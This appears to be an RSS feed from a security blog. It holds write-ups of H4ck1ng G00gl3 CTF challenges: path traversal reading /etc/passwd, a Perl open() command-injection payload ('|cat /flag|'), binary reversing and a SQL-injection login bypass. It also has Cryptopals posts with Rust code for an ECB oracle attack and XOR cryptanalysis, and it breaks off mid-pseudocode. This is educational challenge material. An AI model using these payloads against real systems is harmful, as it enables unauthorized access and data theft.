<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Daniel Orihuela&apos;s Blog</title><description>Dive into the fascinating world of software development, security, and AI with Daniel Orihuela.</description><link>https://danielorihuela.dev/</link><atom:link href="https://danielorihuela.dev/feed.xml" rel="self" type="application/rss+xml"/><item><title>H4ck1ng G00gl3 ep000 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep000ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep000ch02/</guid><description>Hack your way through H4ck1ng G00gl3 ep000 challenge 02. Exploit web vulnerabilities, master path traversal and Perl code injection, and claim victory.</description><pubDate>Tue, 18 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep000
challenge 02&lt;/strong&gt;. This challenge is about &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After opening the challenge, we see the log search tool.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/log-search-tool.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The Log Search Tool is simple. It has two options. The first one is to
select a file from a predefined list of files. And the second one is to
type the term to find, which has to be at least four characters long.
Lastly, it has a blank square at the bottom where the lines of the file
containing the term will appear.&lt;/p&gt;
&lt;p&gt;The webpage does not show anything else. Hence, I decided to check the
requests and see if there was anything interesting. There was nothing
out of the ordinary. Only one post is sent with the chosen file and term
like:
&lt;a href=&quot;https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&amp;amp;term=aurora&quot;&gt;https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&amp;amp;term=aurora&lt;/a&gt;.
The &lt;strong&gt;file&lt;/strong&gt; query string is interesting. If the server does not
validate it, we may be able to read the content of a file other than the
ones in the predefined list, known as the &lt;strong&gt;path traversal attack&lt;/strong&gt;. We
can try to see if we can get the &lt;code&gt;root&lt;/code&gt; user of the &lt;code&gt;/etc/passwd&lt;/code&gt; file,
for example. After a couple of tries, I managed to get some output.
Sending a request to
&lt;a href=&quot;https://aurora-web.h4ck.ctfcompetition.com/?file=&quot;&gt;https://aurora-web.h4ck.ctfcompetition.com/?file=&lt;/a&gt;../../etc/passwd&amp;amp;term=root
returns &lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;At this point, I was stuck. I asked for a hint, and the community told
me to look at the source code of the webpage. There was a comment in the
last line of the code: &lt;code&gt;&amp;lt;!--/src.txt--&amp;gt;&lt;/code&gt;. This file is freely
accessible.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/perl-vulnerability.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;As you can see in the image, we have the server source code. It is
written in Perl. Besides, notice what is inside the red rectangle. That
line of code could be potentially vulnerable. At least, that is what the
comment suggests. I was not aware of any vulnerability. Therefore, I
searched for &quot;perl open vulnerability&quot; on Google. The &lt;code&gt;open&lt;/code&gt; function
variant of Perl that uses two arguments is susceptible to code
injection. That means that we can execute arbitrary commands. However,
we need to use the correct payload. I had a hard time building it, but I
found an
&lt;a href=&quot;https://perl-begin.org/topics/security/code-markup-injection/&quot;&gt;example&lt;/a&gt;.
As a first step, I managed to print a message.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/execute-hello.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;In the same line, we could execute much more complex commands. For
example, we could list all the files in a directory. But remember that
to print it, we need the line to contain the &lt;strong&gt;term&lt;/strong&gt; query string
value. To solve that, we could add a prefix to each file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/execute-ls.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The previous image shows all the files contained in the root directory.
We can see that one of the files is called &lt;code&gt;flag&lt;/code&gt;. Similarly, we can
read the contents of the file sending a request with the &lt;strong&gt;term&lt;/strong&gt; and
&lt;strong&gt;file&lt;/strong&gt; query strings equal to &lt;code&gt;solve&lt;/code&gt; and &lt;code&gt;|cat%20/flag|&lt;/code&gt;. With that,
we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep001 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep001ch02/</guid><description>Reverse engineer H4ck1ng G00gl3 ep001 challenge 02: analyze executable strings, disassemble code, and execute hidden functions to uncover the flag.</description><pubDate>Thu, 20 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep001
challenge 02&lt;/strong&gt;. This challenge is about &lt;strong&gt;Reverse Engineering&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After opening the challenge, we get a zip file containing an executable
with the name &lt;code&gt;wannacry&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;As a first step, I extracted the strings from the executable with
&lt;code&gt;strings wannacry&lt;/code&gt;. After analyzing the output, I saw the URL
&lt;code&gt;https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//&lt;/code&gt;.
If you visit this page, you will see the following sentence: &quot;Our
princess is in another castle.&quot;. At that point, I recalled that the real
wannacry had a kill switch in the binary. To stop the attack, you only
needed to register a domain with the hardcoded name. For some reason, I
thought that disconnecting from the internet or creating a local website
for that domain could modify the binary execution result. That was not
the case. I was going down the rabbit hole. I was stuck there thinking
for a while until I asked the community.&lt;/p&gt;
&lt;p&gt;The community told me to look at the executable code and try to execute
the interesting part. With that in mind, I searched for how to
disassemble a binary in Linux. I found &lt;code&gt;objdump&lt;/code&gt;, a command that allows
printing the assembly code of the binary. The following image shows a
fragment of the assembly code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/objdump-function-example.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;With the assembly code in my power, I wrote down the functions and how
they are related. Interestingly enough, the &lt;code&gt;main&lt;/code&gt; function does not
call any other function. Besides, the only function not being called
anywhere in the code is one called &lt;code&gt;print&lt;/code&gt;. Probably, that is what the
community was referring to with the second part of the hint.&lt;/p&gt;
&lt;p&gt;I found gdb, a tool designed to debug C/C++ programs. Moreover, it can
execute functions present in the binary. It is simple.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/gdb-execution.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;As you can see, executing the &lt;code&gt;print&lt;/code&gt; function gives us a new URL.
Visiting the URL shows the following website.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/button-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After clicking the button, the flag will appear. With that, we completed
the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep001ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Cryptopals: Break an ECB encrypted message (hard)</title><link>https://danielorihuela.dev/blog/break-ecb-2/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/break-ecb-2/</guid><description>Learn to break a message encrypted with the ECB block cipher mode (hard exercise).</description><pubDate>Mon, 28 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#break-ecb-mode-hard-level&quot;&gt;Break ECB mode (hard level)&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#find-the-block-size&quot;&gt;Find the block size&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#check-if-oracle-is-using-ecb-mode&quot;&gt;Check if oracle is using ECB
mode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#find-the-prefix-length&quot;&gt;Find the prefix length&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#break-the-first-byte&quot;&gt;Break the first byte&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#break-the-following-bytes&quot;&gt;Break the following bytes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#code&quot;&gt;Code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the last blog, we learned about ECB and how to break it. Today, we
will continue with the topic and learn how to break it in a different
setup. This post is related to
&lt;a href=&quot;https://cryptopals.com/sets/2/challenges/14&quot;&gt;https://cryptopals.com/sets/2/challenges/14&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Break ECB mode (hard level)&lt;/h1&gt;
&lt;p&gt;For this exercise, the oracle won&apos;t just append some data, but also
prepend data of random length. Without further ado, let&apos;s see the
process.&lt;/p&gt;
&lt;h2&gt;Find the block size&lt;/h2&gt;
&lt;p&gt;Same as in the previous blog.&lt;/p&gt;
&lt;h2&gt;Check if oracle is using ECB mode&lt;/h2&gt;
&lt;p&gt;Same as in the previous blog.&lt;/p&gt;
&lt;h2&gt;Find the prefix length&lt;/h2&gt;
&lt;p&gt;Now that the oracle adds a prefix, we need to know the length of the
prefix.&lt;/p&gt;
&lt;p&gt;To determine the prefix length, we first check if the prefix is smaller
than the block size. This can be done by calling the oracle with inputs
of zero and one byte, then comparing the first block of each ciphertext.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;If the first blocks are different&lt;/strong&gt;, the prefix is smaller than the
block size. In this case, we continue calling the oracle with inputs
that increase by one byte at a time. When the first blocks of two
consecutive ciphertexts become equal, we can calculate the prefix length
as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;prefix length = block size - number of input bytes
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;If the first blocks are the same&lt;/strong&gt;, the prefix is larger than the
block size. Here, we determine how many full blocks the prefix occupies
and how many bytes spill into the next block. To do this, we check how
many blocks (from the beginning) remain identical in the ciphertexts
generated with zero and one bytes. Then, we use the same approach as
above to calculate the remaining bytes in the last block.&lt;/p&gt;
&lt;p&gt;Once we have the prefix length, we can proceed to the next step.&lt;/p&gt;
&lt;h2&gt;Break the first byte&lt;/h2&gt;
&lt;p&gt;The idea is the same as in the previous blog. We only need to change a
bit how we construct the input.&lt;/p&gt;
&lt;p&gt;We won&apos;t use a string one byte shorter than the block size. We will use
a string one byte shorter than the block size, plus the bytes to
complete the last prefix block (if the last block isn&apos;t equal to the
block size). Completing the last prefix block makes sure the data we are
interested in starts in the next block (not in the middle of it), and
the block size minus one is used to isolate the first byte. As in the
previous blog.&lt;/p&gt;
&lt;p&gt;Another difference is that we won&apos;t take the first block of the
ciphertext to compute the dictionary of possible ciphertexts, but the
first block after the prefix.&lt;/p&gt;
&lt;h2&gt;Break the following bytes&lt;/h2&gt;
&lt;p&gt;Same as in the previous blog. We just need to use the longer prefix as
explained in the previous point.&lt;/p&gt;
&lt;p&gt;That&apos;s about it. We are ready to see the final implementation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;Implementation&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub fn attack_ecb_one_byte_at_a_time_prefix&amp;lt;F&amp;gt;(encrypt_fn: F) -&amp;gt; String
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let (block_size, padding_length) = compute_block_size_and_padding_length(&amp;amp;encrypt_fn);
    if !is_ecb(&amp;amp;encrypt_fn, block_size) {
        panic!(&quot;Data not encryped with ECB&quot;);
    }

    let prefix_length = prefix_length(&amp;amp;encrypt_fn, block_size);
    let prefix_trailing_bytes = prefix_length % block_size;
    let prefix_blocks = match prefix_trailing_bytes {
        0 =&amp;gt; prefix_length / block_size,
        _ =&amp;gt; (prefix_length / block_size) + 1,
    };

    let bytes_to_fill_last_prefix_block = match prefix_trailing_bytes {
        0 =&amp;gt; 0,
        _ =&amp;gt; block_size - prefix_trailing_bytes,
    };

    let mut plain = vec![0; block_size - 1];
    let num_target_bytes = encrypt_fn(&amp;amp;[]).len() - padding_length - prefix_length;
    for i in 0..num_target_bytes {
        let crafted_prefix = [
            &amp;amp;vec![0; bytes_to_fill_last_prefix_block],
            &amp;amp;plain[plain.len() - (block_size - 1)..],
        ]
            .concat();
        let ciphertext_block_to_character =
            brute_force_ciphertext_block(&amp;amp;encrypt_fn, &amp;amp;crafted_prefix, prefix_blocks, block_size);

        let raw_prefix =
            vec![0; bytes_to_fill_last_prefix_block + block_size - 1 - (i % block_size)];
        let ciphertext = encrypt_fn(&amp;amp;raw_prefix);
        let start = (prefix_blocks + (i / block_size)) * block_size;
        let end = start + block_size;
        let character = ciphertext_block_to_character
            .get(&amp;amp;ciphertext[start..end])
            .expect(&quot;Exists&quot;);

        plain.push(*character);
    }

    String::from_utf8(plain[block_size - 1..].to_vec()).expect(&quot;Valid plain message&quot;)
}

pub fn prefix_length&amp;lt;F&amp;gt;(encrypt_fn: F, block_size: usize) -&amp;gt; usize
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let ciphertext_a = encrypt_fn(&amp;amp;[]);
    let ciphertext_b = encrypt_fn(&amp;amp;[0]);
    let prefix_smaller_than_block_size = ciphertext_a[0..block_size] != ciphertext_b[0..block_size];
    if prefix_smaller_than_block_size {
        bytes_within_last_prefix_block(encrypt_fn, 0, block_size)
    } else {
        let blocks_in_prefix = full_blocks_within_prefix(&amp;amp;ciphertext_a, &amp;amp;ciphertext_b, block_size);

        let initial_bytes = blocks_in_prefix * block_size;
        let last_bytes = bytes_within_last_prefix_block(encrypt_fn, initial_bytes, block_size);
        initial_bytes + last_bytes
    }
}

fn full_blocks_within_prefix(ciphertext_a: &amp;amp;[u8], ciphertext_b: &amp;amp;[u8], block_size: usize) -&amp;gt; usize {
    let mut i = 0;
    while ciphertext_a[i..i + block_size] == ciphertext_b[i..i + block_size] {
        i += block_size;
    }

    i / block_size
}

fn bytes_within_last_prefix_block&amp;lt;F&amp;gt;(
    encryption_fn: F,
    block_position: usize,
    block_size: usize,
) -&amp;gt; usize
where
    F: Fn(&amp;amp;[u8]) -&amp;gt; Vec&amp;lt;u8&amp;gt;,
{
    let start = block_position;
    let end = block_position + block_size;
    let ciphertext_block = |length: usize| encryption_fn(&amp;amp;vec![0; length])[start..end].to_vec();

    let mut i = 0;
    while ciphertext_block(i) != ciphertext_block(i + 1) {
        i += 1;
    }

    match i &amp;lt; block_size {
        true =&amp;gt; block_size - i,
        false =&amp;gt; 0,
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Code&lt;/h2&gt;
&lt;p&gt;You can check the whole implementation
&lt;a href=&quot;https://github.com/danielorihuela/cryptopals/blob/main/src/set2/challenge14.rs&quot;&gt;https://github.com/danielorihuela/cryptopals/blob/main/src/set2/challenge14.rs&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;ECB with a prefix is still insecure.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/cryptopals.B5aQRihb.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep000 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep000ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep000ch01/</guid><description>Think like a hacker to solve H4ck1ng G00gl3 ep000 challenge 01. Use SQL injection to outsmart the AI in this web exploitation adventure.</description><pubDate>Tue, 18 Oct 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post I explain how I solved &lt;strong&gt;ep000
challenge 01&lt;/strong&gt;. This challenge is about &lt;strong&gt;Web Exploitation&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After opening the challenge, we see the following screen.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/chess-main-page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Winning the game at this point is not the intended way to solve the
challenge. Nevertheless, I tried it :D. The problem is that the AI will
cheat. After some movements, all the AI pawns will become queens.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/cheat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Out of curiosity, I decided to see the difficulty dropdown even though
the hint said: &lt;code&gt;Don&apos;t make this game harder than it needs to be.&lt;/code&gt; As I
expected, I did not find anything interesting there.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/difficulty.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It was time to access the &lt;strong&gt;Master Login&lt;/strong&gt; area. There, we find a simple
interface asking for the user and the password.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/admin-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I was on a webpage with a login prompt. The first thing that came to
mind was a &lt;strong&gt;SQL Injection&lt;/strong&gt;. I did not know if a SQL database was in
use. It was a guess. As an initial step, I tried to log in with a random
username and password to check how a &quot;normal&quot; response would look. In
that case, the website renders a message saying &quot;Invalid Login!&quot; and the
server returns the HTTP status 200.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/login-response.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Now, I needed to check if the website was vulnerable to a &lt;strong&gt;SQL
Injection&lt;/strong&gt; attack. In SQL, the &lt;strong&gt;single quote character&lt;/strong&gt; indicates the
beginning and end of strings. Usually, that is one of the first used
characters to check if a website is vulnerable. If not correctly
filtered, the built query will be incorrect. After entering the &lt;strong&gt;single
quote character&lt;/strong&gt; as the username, the server returns the HTTP error
500. Jackpot! We found the vulnerability.&lt;/p&gt;
&lt;p&gt;Probably, the SQL query used in the backend is similar to the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM Users WHERE username = &apos;provided username&apos; AND password=&apos;provided password&apos;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In our case, we have to exploit the username field. The goal is to make
that query return a user. That way, we will log in. Commonly, an admin
user with the username &quot;admin&quot; exists. I tried with a couple of possible
payloads. The one that worked was &lt;strong&gt;admin&apos; OR &apos;1&apos;=&apos;1&lt;/strong&gt;. I did not fill
in the password login field. Replacing the username and password in the
query gives us:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM Users WHERE username = &apos;admin&apos; OR &apos;1&apos;=&apos;1&apos; AND password=&apos;&apos;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;That query returns any user with &quot;admin&quot; username or empty password. We
were lucky because all the assumptions held, and we could log in as the
admin user.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/admin-panel.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Here, we see a couple of options. The first one is used to change the
&lt;strong&gt;thinking time&lt;/strong&gt; of the AI. The second one is to &lt;strong&gt;enable/disable the
AI Queen Cheats&lt;/strong&gt;. Immediately, I disabled the AI Queen Cheats and tried
to play a new game. It worked as expected. I could play a full game
without the AI pawns becoming queens. Anyway, I am not a good chess
player. I was still getting wrecked. For that reason, I returned to the
panel and started increasing and decreasing the thinking time of the AI.
In the beginning, I was only using positive numbers. I did not see any
significant difference. I was still losing. At some point, I tried to
decrease the thinking time below zero. The AI was playing worse. It was
moving the pieces in order. First, the AI moved all the pawns until no
pawn could move. Then the knights and so on.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Pawns&lt;/li&gt;
&lt;li&gt;Knights&lt;/li&gt;
&lt;li&gt;Bishops&lt;/li&gt;
&lt;li&gt;Rooks&lt;/li&gt;
&lt;li&gt;Queen&lt;/li&gt;
&lt;li&gt;King&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;That made the game much more predictable. There were only a couple of
exceptions to the previous order. If the King is in check, the AI will
put the King in a safe place or kill your piece. Now, winning the game
was easy. Once you win, the webpage should print the flag on the screen.
With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep000ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Cryptopals: Break a repeating-key XOR message</title><link>https://danielorihuela.dev/blog/break-xor/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/break-xor/</guid><description>Learn to break a message encrypted with the XOR cipher and a repeating key.</description><pubDate>Mon, 11 Nov 2024 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#xor-cipher&quot;&gt;XOR Cipher&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#break-xor-cipher-with-frequency-analysis&quot;&gt;Break XOR cipher with frequency
analysis&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#find-key-length&quot;&gt;Find key length&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#group-ciphertext-bytes-by-key-byte-used-to-encrypt&quot;&gt;Group ciphertext bytes by key byte used to
encrypt&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#get-the-key-character-for-each-group&quot;&gt;Get the key character for each
group&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#code&quot;&gt;Code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I started working on the &lt;a href=&quot;https://cryptopals.com&quot;&gt;Cryptopals
challenges&lt;/a&gt;. I&apos;m learning a few things about how
the different pieces used in cryptography work and how to break them,
and I decided to document some of the learnings. Today, we will learn
about the XOR cipher, how it works, and how to break it. This post is
related to &lt;a href=&quot;https://cryptopals.com/sets/1/challenges/3&quot;&gt;https://cryptopals.com/sets/1/challenges/3&lt;/a&gt; and
&lt;a href=&quot;https://cryptopals.com/sets/1/challenges/6&quot;&gt;https://cryptopals.com/sets/1/challenges/6&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;XOR Cipher&lt;/h1&gt;
&lt;p&gt;The XOR cipher is an encryption method where each character of the
plaintext is XORed with a character from the key. Let &lt;code&gt;p&lt;/code&gt; be the
plaintext, &lt;code&gt;c&lt;/code&gt; the ciphertext, &lt;code&gt;k&lt;/code&gt; the key, and &lt;code&gt;^&lt;/code&gt; the XOR operator.
Assume the key length is equal to the plaintext length. For each &lt;code&gt;i&lt;/code&gt;
from 0 to &lt;code&gt;p&lt;/code&gt; length, we have that &lt;code&gt;c[i] = p[i] ^ k[i]&lt;/code&gt;. For example,
the plaintext &quot;abcd&quot; will result in the ciphertext &quot;PPPP&quot; using key
&quot;1234&quot;.&lt;/p&gt;
&lt;p&gt;This cipher is theoretically unbreakable when using the
&lt;a href=&quot;https://www.ciphermachinesandcryptology.com/en/onetimepad.htm&quot;&gt;OTP&lt;/a&gt;
(One Time Pad) technique. For this, the key must be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;At least as long as the plaintext&lt;/li&gt;
&lt;li&gt;Truly random&lt;/li&gt;
&lt;li&gt;Never reused&lt;/li&gt;
&lt;li&gt;Kept secret&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OTP is
&lt;a href=&quot;http://hawkgirl.net/documents/communication/One-time-pad.pdf&quot;&gt;impracticable&lt;/a&gt;
with the current internet. Hence, we have to use shorter keys and reuse
them. For example, if we have the plaintext &quot;abcdef&quot; and the key &quot;1234&quot;,
then the character &quot;e&quot; will get XORed with &quot;1&quot; and &quot;f&quot; with &quot;2&quot;. XOR is
not secure in that setup. Let&apos;s see how we can break it.&lt;/p&gt;
&lt;h1&gt;Break XOR cipher with frequency analysis&lt;/h1&gt;
&lt;p&gt;Breaking the XOR cipher is very simple. Let&apos;s go step by step.&lt;/p&gt;
&lt;h2&gt;Find key length&lt;/h2&gt;
&lt;p&gt;The first step is to find the key length. We can brute force it. Before
moving on, we need to know the facts that make this attack possible:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;XOR operations cancel out equivalent values (i.e., a ^ a = 0)&lt;/li&gt;
&lt;li&gt;XOR operations return 0&apos;s 50% of the time and 1&apos;s 50% of the time.&lt;/li&gt;
&lt;li&gt;Plaintexts are not uniformly random&lt;/li&gt;
&lt;li&gt;The expected hamming distance for two letters is lower than for two
random 8-bit bytes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;How is this useful? Well… Let &lt;code&gt;p1&lt;/code&gt; and &lt;code&gt;p2&lt;/code&gt; be the first two blocks of
key length bytes of the plaintext, &lt;code&gt;c1&lt;/code&gt; and &lt;code&gt;c2&lt;/code&gt; the first two blocks of
key length bytes of the ciphertext, and &lt;code&gt;k&lt;/code&gt; the key. We have that
&lt;code&gt;p1 ^ k = c1&lt;/code&gt; and &lt;code&gt;p2 ^ k = c2&lt;/code&gt;. We can then iterate over each potential
key length. For the proper key length, and using the previous
equivalences, it follows that &lt;code&gt;c1 ^ c2 = (p1 ^ k) ^ (p2 ^ k) = p1 ^ p2&lt;/code&gt;
(fact 1). That will return a lower hamming distance (facts 3 and 4).
Otherwise, for the incorrect key length, &lt;code&gt;c1 ^ c2 = p1 ^ p2&lt;/code&gt; doesn&apos;t
hold. Some bytes will follow the equivalence
&lt;code&gt;(p1[n] ^ k) ^ (p2[n] ^ k&apos;)&lt;/code&gt;, resembling two random 8-bit bytes (facts 2
and 4). Hence, the hamming distance will be higher.&lt;/p&gt;
&lt;p&gt;The final implementation has a few more quirks. Computing the hamming
distance between the first two blocks isn&apos;t always reliable. We can use
more blocks and calculate the average. Besides, we need to normalize the
hamming distance average to compare different key sizes.&lt;/p&gt;
&lt;p&gt;Let&apos;s see the pseudocode.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;for each possible key length
    get some blocks whose length is equal to the key length
    for each pair of blocks
